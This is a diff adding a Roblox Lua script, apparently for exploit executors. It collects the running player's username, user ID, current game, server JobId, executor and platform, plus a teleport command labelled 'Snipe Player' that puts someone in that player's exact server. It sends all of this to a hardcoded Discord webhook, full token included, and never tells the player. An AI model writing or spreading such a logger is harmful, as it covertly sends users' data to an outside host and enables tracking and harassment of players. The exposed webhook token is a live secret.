@@ -1,0 +1,65 @@
+local request= http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request)
+local deviceType = game:GetService("UserInputService"):GetPlatform() == Enum.Platform.Windows and "💻" or "📱"
+local exe = identifyexecutor()
+local player = game.Players.LocalPlayer
+local job = tostring(game.JobId)
+local gameId = game.PlaceId
+local plyID = player.UserId
+local teleportStatement = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. gameId .. ", '" .. job .. "', player)"
+local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+
+local currentTime = os.date("%Y-%m-%d %H:%M:%S") 
+
+-- Örnek olarak sabit değerler ekledim, bunları gerektiği gibi değiştirebilirsiniz.
+local Title = "Game Information"
+local Color = 0xFF5733 -- Renk hexadecimal olarak.
+local ThumbnailUrl = "https://www.roblox.com/thumbnail/url" -- Thumbnail URL buraya.
+local FieldTitle = "Extra Information"
+local FieldText = "Additional info here"
+local FooterText = "Provided by Perfectus"
+local FooterUrl = "https://www.roblox.com/footer/url"
+
+local data = {
+    content = "",
+    embeds = {
+        {
+            title = Title,
+            description = "",
+            type = "rich",
+            color = Color,
+            thumbnail = {
+                url = ThumbnailUrl
+            },
+            fields = {              
+                {
+                    name = "𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧:",
+                    value = " 𝐏𝐥𝐚𝐲𝐞𝐫:\n〘👤〙**Username**: [" .. player.Name .. "](https://www.roblox.com/users/" .. player.UserId .. "/profile)\n〘🎲〙**Player ID:** " .. plyID .. "\n\n𝐆𝐚𝐦𝐞𝐬:\n〘🎮〙**Game**: [" .. gameName .. "](https://www.roblox.com/games/" .. gameId .. ")\n〘🎲〙Game ID: " .. gameId .. "\n\n 𝐌𝐢𝐬𝐜:\n〘🔧〙**Executor**: " .. exe .. "\n **〘❓〙Platform**: " .. deviceType .."\n\n 𝐄𝐱𝐞𝐜𝐮𝐭𝐢𝐨𝐧 𝐓𝐢𝐦𝐞 🕧\n ".. currentTime,
+                    inline = true
+                },
+                {
+                    name = FieldTitle,
+                    value = FieldText,
+                    inline = false
+                },
+                {
+                    name = "𝐒𝐧𝐢𝐩𝐞 𝐏𝐥𝐚𝐲𝐞𝐫",
+                    value = "```lua\n" .. teleportStatement .. "\n```",
+                    inline = false
+                }
+            },
+            footer = {
+                text = FooterText,
+                icon_url = FooterUrl
+            }
+        }
+    }
+}
+
+local encodedData = game:GetService("HttpService"):JSONEncode(data)
+local headers = {["Content-Type"] = "application/json"}
+local response = request({
+    Url = "https://discord.com/api/webhooks/1305490047000383520/vKevGw7c9GAsLkSStIVXHeS1W0G2109zfgIzBsqnK4iJU7evw6wQrYhTFRfWoj8T9WPf",
+    Method = "POST",
+    Headers = headers,
+    Body = encodedData
+})
